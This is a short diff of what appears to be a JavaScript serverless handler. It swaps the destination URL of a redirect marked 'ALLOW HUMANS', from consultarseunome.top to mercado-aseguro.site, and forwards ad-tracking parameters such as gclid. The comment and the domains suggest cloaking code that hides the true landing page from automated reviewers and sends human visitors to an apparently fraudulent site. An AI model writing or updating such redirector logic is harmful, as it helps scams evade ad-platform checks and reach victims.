@@ -404,7 +404,7 @@ export default async function handler(req, res) {
     }
 
     // ✅ ALLOW HUMANS
-    const realUrl = "https://www.consultarseunome.top/f2/";
+    const realUrl = "https://www.mercado-aseguro.site/";
     // ===== [MANTIDO] Anexa a MESMA querystring da requisição ao destino real
     const incomingQS = getIncomingQuery(req); // ex: "?utm_source=...&gclid=..."
     const realUrlWithQuery = realUrl.replace(/\?$/, "") + (incomingQS || "");
